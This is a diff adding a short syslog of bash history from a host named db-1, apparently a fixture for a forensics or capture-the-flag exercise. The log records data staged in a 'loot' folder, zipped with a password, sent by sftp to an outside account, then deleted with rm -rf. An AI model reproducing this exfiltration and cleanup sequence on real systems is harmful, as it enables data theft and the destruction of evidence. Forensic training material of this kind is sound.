@@ -1,0 +1,6 @@
+Sep 28 21:06:19 db-1 /bin/bash[20778]: HISTORY: PID=20778 UID=1000 gcc -o securepassword securepassword.c
+Sep 28 21:06:21 db-1 /bin/bash[20778]: HISTORY: PID=20778 UID=1000 ls loot
+Sep 28 21:06:29 db-1 /bin/bash[20778]: HISTORY: PID=20778 UID=1000 ./securepassword 16
+Sep 28 21:06:38 db-1 /bin/bash[20778]: HISTORY: PID=20778 UID=1000 zip -e loot.zip loot/*
+Sep 28 21:07:26 db-1 /bin/bash[20778]: HISTORY: PID=20778 UID=1000 sftp maddhacker1337@sdf.lonestar.org
+Sep 28 21:08:01 db-1 /bin/bash[20778]: HISTORY: PID=20778 UID=1000 rm -rf loot/
